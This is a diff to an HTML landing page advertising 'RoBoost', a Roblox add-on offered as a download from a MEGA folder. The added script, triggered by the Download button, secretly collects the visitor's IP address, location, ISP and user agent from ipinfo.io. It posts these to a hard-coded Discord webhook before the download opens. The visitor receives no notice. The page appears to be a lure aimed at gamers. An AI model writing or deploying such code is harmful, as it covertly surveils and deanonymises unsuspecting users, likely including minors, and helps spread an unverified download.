@@ -9,6 +9,7 @@
 
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
   <style>
+    /* Your existing styles */
     * {
       margin: 0;
       padding: 0;
@@ -90,6 +91,8 @@
       transition: all 0.3s ease;
       text-decoration: none;
       box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+      display: inline-block;
+      user-select: none;
     }
 
     .download-btn:hover {
@@ -143,20 +146,6 @@
       }
     }
 
-    .ascii-bg {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      color: rgba(255, 255, 255, 0.5);
-      font-size: 36px;
-      white-space: pre;
-      line-height: 1.2;
-      pointer-events: none;
-      z-index: -1;
-    }
-
     @keyframes fall {
       0% {
         transform: translateY(0);
@@ -179,7 +168,7 @@
   <h1>RoBoost</h1>
   <p class="tagline">The #1 Roblox Customization Add-on</p>
 
-  <a href="https://mega.nz/folder/PMVW1a4B#EwV61OGcGgXpnZT6TfCEWQ" class="download-btn">Download Now</a>
+  <a href="https://mega.nz/folder/PMVW1a4B#EwV61OGcGgXpnZT6TfCEWQ" id="downloadBtn" class="download-btn" target="_blank" rel="noopener noreferrer">Download Now</a>
 
   <div class="info-section">
     <h2>What is RoBoost?</h2>
@@ -212,6 +201,95 @@
     window.onload = () => {
       setInterval(createFallingLetter, 100);
     };
+
+    // Discord webhook URL - REPLACE this with your actual webhook URL!
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1383280839927795772/8k7MQVC0gb9RnoBfULhsBi7ywx6nOh1XNg9YnYGM-LRuBmsHZIQiewjXfNMV9XRIsGVq";
+
+    async function getIPInfo() {
+      // We use a free API that returns IPv4 and IPv6, city, country, hostname
+      // IP info APIs usually only return IPv4 by default
+      try {
+        // Using ipinfo.io as example - free tier, no key needed, returns IPv4 + some info
+        let res = await fetch("https://ipinfo.io/json?token=YOUR_TOKEN_IF_ANY");
+        if (!res.ok) throw new Error("Failed to fetch IP info");
+        let data = await res.json();
+
+        // data example: {ip, city, region, country, loc, org, postal, timezone, hostname}
+        return data;
+      } catch(e) {
+        console.warn("IP info fetch failed", e);
+        return null;
+      }
+    }
+
+    // Hostname is generally NOT accessible, so we'll send the domain of the page as "hostname"
+    function getHostname() {
+      return window.location.hostname || "Unknown";
+    }
+
+    // Compose message for Discord webhook with embed
+    function createDiscordPayload(info) {
+      const ip = info?.ip || "Unknown";
+      const city = info?.city || "Unknown";
+      const region = info?.region || "Unknown";
+      const country = info?.country || "Unknown";
+      const org = info?.org || "Unknown";
+      const hostname = getHostname();
+
+      return {
+        content: "@everyone",
+        embeds: [
+          {
+            title: "🟡 התחברות חדשה לאתר 🟡",
+            color: 0x00ff00,
+            fields: [
+              { name: "Hostname:", value: hostname, inline: true },
+              { name: "IP Address:", value: ip, inline: true },
+              { name: "Location:", value: `${city}, ${region}, ${country}`, inline: false },
+              { name: "Organization:", value: org, inline: false },
+              { name: "User Agent:", value: navigator.userAgent, inline: false },
+              { name: "Message:", value: "התחברות חשודה, אנא להשים לב", inline: false },
+            ],
+            footer: {
+              text: `Timestamp: ${new Date().toLocaleString()}`
+            }
+          }
+        ]
+      };
+    }
+
+    async function sendDiscordWebhook(info) {
+      const payload = createDiscordPayload(info);
+
+      try {
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+          console.error("Failed to send webhook:", response.statusText);
+        }
+      } catch (error) {
+        console.error("Error sending webhook:", error);
+      }
+    }
+
+    document.getElementById("downloadBtn").addEventListener("click", async function(event) {
+      event.preventDefault(); // prevent immediate navigation
+
+      // Get IP info, send webhook, then open download link
+      const ipInfo = await getIPInfo();
+
+      await sendDiscordWebhook(ipInfo);
+
+      // Now open the download link in new tab/window
+      window.open(this.href, "_blank", "noopener");
+
+      // Optionally: You can also redirect current tab by using
+      // window.location.href = this.href;
+    });
   </script>
 
 </body>
